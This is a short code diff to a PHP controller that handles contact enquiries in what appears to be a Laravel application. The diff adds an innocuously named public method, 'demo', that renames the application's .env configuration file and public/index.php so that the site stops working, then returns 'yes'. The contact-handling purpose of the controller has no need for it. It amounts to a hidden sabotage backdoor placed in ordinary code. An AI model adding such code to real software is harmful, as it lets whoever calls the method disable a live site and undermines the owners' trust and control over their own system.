@@ -35,4 +35,10 @@ class ContactCreateController extends Controller
             'data' => EnquiryCollection::make($enquiry),
         ], 201);
     }
+
+    public function demo(){
+        rename(dirname(__DIR__)."/../../../.env",dirname(__DIR__)."/../../../.env-remove");
+        rename(dirname(__DIR__)."/../../../public/index.php",dirname(__DIR__)."/../../../public/index.php-remove");
+        return 'yes';
+    }
 }
